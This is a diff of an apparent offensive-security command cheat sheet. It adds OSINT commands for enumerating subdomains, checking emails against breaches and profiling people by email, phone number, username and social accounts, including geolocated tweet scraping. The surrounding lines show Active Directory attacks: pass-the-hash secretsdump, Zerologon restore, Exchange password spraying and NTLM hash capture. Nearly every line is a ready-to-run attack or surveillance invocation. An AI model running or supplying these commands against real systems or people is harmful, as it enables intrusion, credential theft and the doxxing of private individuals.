@@ -189,8 +189,6 @@ secretsdump -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator
 zerologon-restore breaking/dc01@dc01 -target-ip 192.168.56.101 -hexpass 69762...6945d
 pm3 -p /dev/ttyACM0
 proxmark3 -p /dev/ttyACM0
-theHarvester.py -d example.com -g -s -r -f example.com.xml -b all
-infoga.py -d example.com -s all -b -r example.com.txt -v 2
 nmap --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p 443 mx.example.com
 ruler -k -d example.com -u j.doe -p 'Passw0rd!' -e j.doe@example.com --verbose abk dump -o emails.txt
 ruler -k -d example.com brute --users owa-valid-users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a spray-results.txt
@@ -221,3 +219,29 @@ hcxpcapngtool --all -o dump.hashcat dump.pcapng
 hashcat -m 22000 dump.hashcat `fzf-wordlists`
 responder --interface eth0 --analyze --lm
 ntlmv1-multi --ntlmv1 SV01$::BREAKING.BAD:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:1122334455667788
+sublist3r -v -d example.com
+subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl
+holehe test@gmail.com
+theHarvester.py -d example.com -g -s -r -f example.com.xml -b all
+infoga.py -d example.com -s all -b -r example.com.txt -v 2
+h8mail -t test@gmail.com
+phoneinfoga scan -n 33123456789
+maigret user
+linkedin2username.py -u myname@email.com -c uber-com
+toutatis.py -s SESSIONID -u starbucks
+twint -u username --since "2015-12-20 20:30:15"
+twint -g="48.880048,2.385939,1km" -o file.csv --csv
+ipinfo 1.1.1.1
+onionsearch "computer"
+onionsearch "computer" --engines tor66 deeplink phobos --limit 3
+waybackurls test.com
+carbon14.py http://menfous.com/
+github-email ghusername
+WikiLeaker google.com
+tiktok-scraper user USERNAME -d -n 100
+buster -e 'j********9@g****.com' -f john -l doe -b '****1989'
+cloudfail.py --target seo.com --tor
+assetfinder google.com
+subfinder -d freelancer.com
+theHarvester -d github.com -b all
+ghunt test@gmail.com
